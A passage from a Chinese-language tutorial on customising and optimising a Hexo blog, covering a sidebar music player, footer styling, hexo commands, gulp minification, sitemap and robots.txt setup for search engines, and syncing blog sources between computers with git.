title="侧栏添加音乐"></a>侧栏添加音乐</h3><blockquote><p>去往<em><a href="http://music.163.com/" target="_blank" rel="noopener">网易云音乐</a></em>搜索喜欢的音乐，点击生成外链播放器，复制代码直接放到博文末尾即可，<code>height</code>设为0可隐藏播放器，但仍然可以播放音乐，<code>auto</code>设成0可手动播放，默认是1自动播放，可把代码放到<code>themes/next/layout/_custom/sidebar.swig</code>文件里，播放器会显示在站点预览中</p></blockquote><h3 id="footer居中"><a href="#footer居中" class="headerlink" title="footer居中"></a>footer居中</h3><blockquote><p>修改<code>your blog\themes\next\source\css\_schemes\Mist\index.styl</code>文件，将<code>.footer-inner</code>中的<code>text-align: left;</code>修改为<code>text-align: center;</code>即可。</p></blockquote><h2 id="简单的命令"><a href="#简单的命令" class="headerlink" title="简单的命令"></a>简单的命令</h2><blockquote><p>总结一下简单的使用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo init [folder] <span class="comment"># 初始化一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站  </span></span><br><span class="line">hexo new [layout] &lt;title&gt; <span class="comment"># 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default\_layout 参数代替。如果标题包含空格的话，请使用引号括起来  </span></span><br><span class="line">hexo version <span class="comment"># 查看版本  </span></span><br><span class="line">hexo clean <span class="comment"># 清除缓存文件 (db.json) 和已生成的静态文件 (public)  </span></span><br><span class="line">hexo g <span class="comment"># 等于hexo generate # 生成静态文件  </span></span><br><span class="line">hexo s <span class="comment"># 等于hexo server # 本地预览  </span></span><br><span class="line">hexo d <span class="comment"># 等于hexo deploy # 部署，可与hexo g合并为 hexo d -g</span></span><br></pre></td></tr></table></figure></p></blockquote><h2 id="站点加速"><a href="#站点加速" class="headerlink" title="站点加速"></a>站点加速</h2><h3 id="使用云盘存放图片资源"><a href="#使用云盘存放图片资源" class="headerlink" title="使用云盘存放图片资源"></a>使用云盘存放图片资源</h3><blockquote><p>由于<code>Github</code>的服务器在海外，那么如果把图片也放到<code>Github</code>显然是不科学的，而且<code>Github</code>的存储空间也有局限，那么在这里博主推荐使用<em><a href="http://www.qiniu.com/" target="_blank" rel="noopener">七牛云储存</a></em><br>免费用户实名审核之后，新建空间，专门用来放置博客上引用的资源，进入空间后点击「内容管理」，再点击「上传」<br><img src="http://ojoba1c98.bkt.clouddn.com/uploadImg.png" alt=""><br>上传完成之后点击关闭回到管理页面，选中刚上传的图片，最右边的操作点击复制链接即可<br><img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/qiniu.jpg" alt=""><br>然后在博文中通过地址引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](图片地址如:http://ojoba1c98.bkt.clouddn.com/img/build-hexo/copyUrl.png)</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="压缩代码"><a href="#压缩代码" class="headerlink" title="压缩代码"></a>压缩代码</h3><blockquote><p>安装插件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install gulp -g</span><br><span class="line">$ npm install gulp-minify-css gulp-uglify gulp-htmlmin gulp-htmlclean gulp --sav</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>在博客根目录下新建 gulpfile.js ，并填入以下内容：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">'gulp-htmlmin'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">'gulp-htmlclean'</span>);</span><br><span class="line"><span class="comment">// 压缩 public 目录 css</span></span><br><span class="line">gulp.task(<span class="string">'minify-css'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.css'</span>)</span><br><span class="line">        .pipe(minifycss())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 压缩 public 目录 html</span></span><br><span class="line">gulp.task(<span class="string">'minify-html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.html'</span>)</span><br><span class="line">    .pipe(htmlclean())</span><br><span class="line">    .pipe(htmlmin(&#123;</span><br><span class="line">         removeComments: <span class="literal">true</span>,</span><br><span class="line">         minifyJS: <span class="literal">true</span>,</span><br><span class="line">         minifyCSS: <span class="literal">true</span>,</span><br><span class="line">         minifyURLs: <span class="literal">true</span>,</span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./public'</span>))</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 压缩 public/js 目录 js</span></span><br><span class="line">gulp.task(<span class="string">'minify-js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.js'</span>)</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行 gulp 命令时执行的任务</span></span><br><span class="line">gulp.task(<span class="string">'default'</span>, [</span><br><span class="line">    <span class="string">'minify-html'</span>,<span class="string">'minify-css'</span>,<span class="string">'minify-js'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>生成博文是执行 hexo g &amp;&amp; gulp 就会根据 gulpfile.js 中的配置，对 public 目录中的静态资源文件进行压缩。</p></blockquote><h2 id="SEO-搜索引擎优化"><a href="#SEO-搜索引擎优化" class="headerlink" title="SEO(搜索引擎优化)"></a>SEO(搜索引擎优化)</h2><h3 id="网站验证"><a href="#网站验证" class="headerlink" title="网站验证"></a>网站验证</h3><blockquote><p>以下是几个搜索引擎的提交入口：</p><ul><li><strong><em><a href="http://zhanzhang.baidu.com/linksubmit/url" target="_blank" rel="noopener">百度提交入口</a></em></strong></li><li><strong><em><a href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener">Google提交入口</a></em></strong></li><li><strong>_<a href="http://info.so.360.cn/site_submit.html" target="_blank" rel="noopener">360提交入口</a>_</strong></li></ul></blockquote><h3 id="添加并提交sitemap"><a href="#添加并提交sitemap" class="headerlink" title="添加并提交sitemap"></a>添加并提交sitemap</h3><blockquote><p>安装hexo的<code>sitemap</code>网站地图生成插件:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save  </span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure></p></blockquote><p>在站点配置文件或主题配置文件加入：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/sec_youhua.png" alt="mark"><br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sitemap:</span>   </span><br><span class="line"><span class="attr"> path:</span> <span class="string">sitemap.xml</span>  </span><br><span class="line"><span class="attr">baidusitemap:</span>  </span><br><span class="line"><span class="attr"> path:</span> <span class="string">baidusitemap.xml</span></span><br></pre></td></tr></table></figure></p><blockquote><p>在<code>hexo-site\source</code>中新建文件<code>robots.txt</code>,内容如下，请自行替换<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">User-agent:</span> <span class="string">*</span></span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/</span>  </span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/archives/</span>  </span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/categories/</span>  </span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/tags/</span>  </span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/about/</span>  </span><br><span class="line"><span class="attr">Allow:</span> <span class="string">/count/</span></span><br><span class="line"><span class="attr">Disallow:</span> <span class="string">/js/</span>  </span><br><span class="line"><span class="attr">Disallow:</span> <span class="string">/css/</span>  </span><br><span class="line"><span class="attr">Disallow:</span> <span class="string">/fonts/</span>  </span><br><span class="line"><span class="attr">Disallow:</span> <span class="string">/vendors/</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">Sitemap:</span> <span class="attr">http://longofo.cc/sitemap.xml</span>  </span><br><span class="line"><span class="attr">Sitemap:</span> <span class="attr">http://longofo.cc/baidusitemap.xml</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>Allow</code>后面的就是你的<code>menu</code> 可以在主题配置文件中找到。<br>前往链接：<a href="https://www.google.com/webmasters/" target="_blank" rel="noopener">https://www.google.com/webmasters/</a><br>添加你的网站。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/google_add_attr.png" alt="mark"><br>下载验证文件放入<code>hexo-site\source</code>中<br>Tips: 站点配置文件忽略Google的验证文件。这样<code>clean</code>的时候就不会被删除了。<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">README.md</span>  </span><br><span class="line"><span class="bullet">    -</span> <span class="string">google*****.html</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/google_sitemap.PNG" alt="mark"><br>打开站点地图：添加站点地图。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="http://p5m1dtoh7.bkt.clouddn.com/google_sitemap_detail.PNG" alt="mark"><br>可以进入站点地图详情查看有没有报错。</p></blockquote><h3 id="robots-txt测试"><a href="#robots-txt测试" class="headerlink" title="robots.txt测试"></a>robots.txt测试</h3><blockquote><p><a href="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/robots_test.png" target="_blank" rel="noopener"><img src="http://p5m1dtoh7.bkt.clouddn.com/google_robots_test.PNG" alt="mark"></a></p></blockquote><h3 id="百度搜索资源平台"><a href="#百度搜索资源平台" class="headerlink" title="百度搜索资源平台"></a>百度搜索资源平台</h3><blockquote><p>由于百度的爬虫会被github屏蔽,我在网上找了很多解决方法,最后使用了<em><a href="http://www.yuan-ji.me/Hexo-优化：提交sitemap及解决百度爬虫抓取-GitHub-Pages-问题/" target="_blank" rel="noopener">这个方法</a>解决了</em></p></blockquote><h2 id="多PC同步源码"><a href="#多PC同步源码" class="headerlink" title="多PC同步源码"></a>多PC同步源码</h2><blockquote><p>1.准备工作：公司电脑和家里电脑配置git ssh密钥连接<br>2.上传blog到git：此项建议先在blog进度最新的PC上进行，否则会有版本冲突，解决也比较麻烦。在PC上建立git ssh密钥连接和建立新库respo在此略过：</p><ul><li>编辑<code>.gitignore</code>文件：<code>.gitignore</code>文件作用是声明不被git记录的文件，blog根目录下的<code>.gitignore</code>是hexo初始化是创建的，可以直接编辑，建议<code>.gitignore</code>文件包括以下内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store   </span><br><span class="line">Thumbs.db   </span><br><span class="line">db.json   </span><br><span class="line">*.log   </span><br><span class="line">node_modules/   </span><br><span class="line">public/   </span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p><code>public</code>内的文件可以根据<code>source</code>文件夹内容自动生成的，不需要备份。其他日志、压缩、数据库等文件也都是调试等使用，也不需要备份。</p><p>初始化仓库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init  </span><br><span class="line">git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>server</code>是仓库的在线目录地址，可以从git上直接复制过来，<code>origin</code>是本地分支，<code>remote add</code>会将本地仓库映射到托管服务器的仓库上。<br>添加本地文件到仓库并同步到git上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add . <span class="comment">#添加blog目录下所有文件，注意有个'.'(.gitignore里面声明的文件不在此内)   </span></span><br><span class="line">git commit -m <span class="string">"hexo source first add"</span> <span class="comment">#添加更新说明   </span></span><br><span class="line">git push -u origin master  <span class="comment">#推送更新到git上</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>至此，git库上备份已完成。</p><p>3.将git的内容同步到另一台电脑：假设之前将公司电脑中的blog源码内容备份到了git上，现在家里电脑准备同步源码内容。<strong>注意</strong>，在同步前也要事先建好hexo的环境，不然同步后本地服务器运行时会出现无法运行错误。在建好的环境的主目录运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment">#将目录添加到版本控制系统中  </span></span><br><span class="line">git remote add origin &lt;server&gt; <span class="comment">#同上  </span></span><br><span class="line">git fetch --all <span class="comment">#将git上所有文件拉取到本地  </span></span><br><span class="line">git reset --hard origin/master <span class="comment">#强制将本地内容指向刚刚同步git云端内容</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>reset</code>对所拉取的文件不做任何处理，此处不用<code>pull</code>是因为本地尚有许多文件，使用<code>pull</code>会有一些<strong>版本冲突</strong>，解决起来也麻烦，而本地的文件都是初始化生成的文件，较拉取的库里面的文件而言基本无用，所以直接丢弃。</p><p>4.家里电脑生成完文章并部署到服务器上后，此时需要将新的blog源码文件更新到git托管库上，不然公司电脑上无法获取最新的文章。在本地文件中运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add . <span class="comment">#将所有更新的本地文件添加到版本控制系统中</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>此时可以使用<code>git status</code>查看本地文件的状态。然后对更改添加说明更推送到git托管库上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">'更新信息说明'</span>   </span><br><span class="line">git push</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>至此，家里电脑更新的备份完成。在公司电脑上使用时，只需先运行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>获取的源码即为最新文件</p></blockquote><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>折腾起来还是挺累的，不过也学到了一些东西，同时还要感谢很多大佬的文章由衷感谢。</p><blockquote><p><strong>参考</strong><br><em><a href="http://yangbingdong.com/2017/build-blog-hexo-advanced/" target="_blank" rel="noopener">http://yangbingdong.com/2017/build-blog-hexo-advanced/</a></em><br><em><a href="https://thief.one/2017/03/03/Hexo搭建博客教程/" target="_blank" rel="noopener">https://thief.one/2017/03/03/Hexo搭建博客教程/</a></em><br><em><a href="http://mtianyan.gitee.io/post/a625fa82.html" target="_blank" rel="noopener">http://mtianyan.gitee.io/post/a625fa82.html</a></em><br><em><a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26625249</a></em><br>…</p></blockquote>]]></content>
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 搭建博客 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
